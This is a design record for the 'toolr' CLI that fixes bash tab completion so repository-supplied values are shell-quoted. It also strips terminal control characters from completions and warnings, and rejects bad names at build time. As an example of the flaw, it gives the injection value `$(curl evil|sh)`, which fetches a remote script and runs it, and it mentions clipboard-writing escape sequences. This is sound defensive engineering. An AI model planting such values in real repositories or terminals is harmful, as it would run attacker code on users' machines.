# Repo-derived strings must be safe to hand to a shell or terminal

- **Status:** implemented
- **Origin:** whole-project review findings F-01 (critical), F-13 and F-05.
- **Plan:** [`2026-10-30-safe-shell-output-plan.md`](./2026-10-30-safe-shell-output-plan.md)
- **Blocks:** `2026-10-30-repo-trust-design.md` (on `feat/repo-trust`)
  assumes an untrusted repo is inert on TAB. That's false until this lands.

## Problem

Group names, command names, flag spellings, `Literal`/`Enum` values and
help strings all come from a repository's `tools/*.py`. Some also come
from argparse sources, third-party plugin fragments or a committed
`tools/.toolr-manifest.json`. toolr passes them to shells and terminals
without making them safe:

1. **F-01, bash runs them.** `crates/toolr-core/src/complete/scripts/bash.sh:34`
   does `COMPREPLY=($(compgen -W "${values[*]}" -- "$cur"))`. `compgen -W`
   expands its word list, so a value such as `$(curl evil|sh)` runs when
   the user presses TAB. Even without `compgen`, bash inserts `COMPREPLY`
   entries verbatim, so an unquoted value runs when the user presses Enter.
   The same line also splits values containing spaces into several
   candidates, and repeats prefix matching the engine has already done.
2. **F-13, control characters reach the terminal on TAB.**
   `Candidate::new` (`crates/toolr-core/src/complete/engine.rs`) replaces
   only `\t\n\r` in descriptions and nothing in values. ESC sequences
   reach zsh/fish menus; a newline in a value forges extra candidates.
3. **F-05, control characters reach the terminal on every invocation.**
   `crates/toolr/src/main.rs` prints `plugin_warnings[].message` raw. A
   committed manifest can carry OSC 52 (clipboard write) or title/CSI
   sequences.

## Decision

Three layers. Each one stands on its own.

### A. The bash script quotes, never expands

`_toolr_complete` in `bash.sh`:

- Reads `__complete` output line by line and takes the value before the
  first tab.
- Keeps a value only if it starts with `$cur`, compared literally
  (`[[ $v == "$cur"* ]]`).
- Appends it as `COMPREPLY+=("$(printf '%q' "$v")")`.
- Never calls `compgen -W`.

It must work on bash 3.2 (the macOS system bash), so: no `mapfile`, no
`${var@Q}`, no associative arrays.

The zsh and fish scripts don't change. `compadd -a` and fish's
`complete -a "(…)"` treat candidates as data and quote them when
inserting. This is believed, not yet proven; Task 1 adds tests that prove
it, and if one fails, that script gets fixed in the same task.

### B. One sanitiser for every repo-derived string shown to a user

New module `toolr_core::text` with:

- `pub fn has_control_chars(s: &str) -> bool`: true for any char in
  `U+0000..=U+001F`, `U+007F`, or `U+0080..=U+009F`.
- `pub fn strip_control_chars(s: &str) -> String`: replaces each such
  char with a space, then collapses runs of spaces to one. (Replacing with
  a space keeps the word boundaries a stripped `\n` or `\t` used to mark.)
- `pub fn strip_control_chars_per_line(s: &str) -> String`: strips each
  line on its own, so clean lines keep their indentation and inner spacing.
- `pub fn escape_control_chars(s: &str) -> String`: renders each control
  char as `\u{..}` and leaves the rest alone.

Used by:

- `Candidate::new`: the description goes through `strip_control_chars`
  (replacing today's `\t\n\r` handling).
- The completion engine: a candidate whose **value** has control chars is
  dropped, never emitted. It can't be both shown faithfully and kept safe.
- `main.rs`: each `plugin_warnings` message goes through
  `strip_control_chars` before printing.
- `cli.rs`: group titles, summaries, descriptions, argument help, metavars
  and section headings go through `strip_control_chars_per_line` before
  clap renders them. Choices with control chars are filtered out, and a
  default with control chars is dropped.
- Build errors: names and group refs go through `escape_control_chars`.

Names can't be stripped: clap and dispatch use them verbatim, so a cleaned
name would point at nothing. `Manifest::drop_control_char_names` runs at
load time, in `main.rs` and in `complete/freshness.rs`, so clap and TAB see
the same commands. It drops each group whose path has a control char, and
the whole command when its name, group or any argument identifier (id,
long flag, aliases, `requires`, `conflicts_with`) has one. Each drop raises
a `PluginWarningKind::Dropped` warning, held in memory only and never
written to the manifest.

### C. The parser rejects them at build time

A new `BuildError::InvalidNames(Vec<InvalidName>)`, checked after the
existing positional-arity check in `build_static_manifest_inner`
(`crates/toolr-core/src/parser/build.rs`). All violations are reported at
once, like the other `BuildError`s.

| Item | Rejected if it contains |
|---|---|
| Group name | a control char or whitespace |
| Command CLI name | a control char or whitespace |
| Command group reference (`Command.group`) | a control char or whitespace |
| Argument name (`Argument.name`) | a control char or whitespace |
| argparse-scanned flag spelling (`Argument.long_flag`) | a control char or whitespace |
| `Literal` / `Enum` value (`Argument.allowed_values`) | a control char (spaces are allowed) |

Each error line reads
``<module>::<function or group> <item> `<value, with control chars shown as \u{..}>`: <reason>``.

Shell metacharacters (`$`, `|`, `;`, backticks, quotes) stay **legal**.
Layer A quotes them, and rejecting them would break legitimate values.

## Scope and compatibility

- **The manifest format is unchanged; the new warning kind is never written.**
- **Third-party fragments and old manifests** are covered by layer B at
  output time. Layer C only affects manifests built by this version.
- **Breaking only for names that are already broken:** a group or command
  name with whitespace or control chars, which clap can't parse sensibly
  anyway. Release note under "Fixed".
- `UNRELEASED.md`:

  > Bash tab completion no longer expands candidate values: a value such as
  > `$(…)` declared in a repository's `tools/` used to run when you pressed
  > TAB. Values are now shell-quoted when inserted, and values containing
  > spaces complete as one word. Control characters in command names,
  > choices, help text and plugin warnings are no longer passed to your
  > terminal, and the manifest build rejects group names, command names
  > and argparse flags containing whitespace or control characters, and
  > choice values containing control characters. Re-run
  > `toolr self completion install bash` (or re-source the script) to pick
  > up the fix.

## Not covered

- Users who installed the bash script and never re-install it keep the
  vulnerable copy. The release note tells them to re-install. Worth
  considering separately: `toolr self completion install` writes a
  script that sources `toolr self completion print bash` at shell start,
  so future fixes apply without a re-install.
